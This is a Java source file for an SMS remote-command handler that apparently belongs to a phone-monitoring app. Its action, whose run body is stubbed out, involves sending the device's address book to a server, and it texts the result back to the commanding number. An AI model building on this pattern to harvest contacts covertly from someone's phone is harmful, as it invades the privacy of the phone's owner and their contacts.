package com.vvt.rmtcmd.sms;

import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.SendAddressBookApprovalCmdResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public class SMSSendAddrForApproval extends RmtCmdAsync implements PhoenixProtocolListener {
	
	public SMSSendAddrForApproval(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// Runnable
	public void run() {
		/*// TODO: Not supported
		doSMSHeader(smsCmdCode.getSendAddrForApprovalCmd());
		responseMessage.append(RmtCmdTextResource.COMMAND_BEING_PROCESSED);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// TODO: Add logic
		
		*/
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}	
	
	// PhoenixProtocolListener
	public void onError(String message) {
		Log.error("CmdSyncTime.onError()", "message: " + message);
//		syncTimeMng.removeListener(this);
		doSMSHeader(smsCmdCode.getSendAddrForApprovalCmd());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
	}

	// PhoenixProtocolListener
	public void onSuccess(CommandResponse response) {
//		syncTimeMng.removeListener(this);
		doSMSHeader(smsCmdCode.getSendAddrForApprovalCmd());
		if (response instanceof SendAddressBookApprovalCmdResponse) {
			SendAddressBookApprovalCmdResponse sendAddrForApprovResp = (SendAddressBookApprovalCmdResponse)response;
			if (sendAddrForApprovResp.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.SEND_ADDRESSBOOK_FOR_APPROVAL_EXECUTED);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendAddrForApprovResp.getServerMsg());								
			}
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
		}
	}	
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdSendAddrForApproval.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}	
}
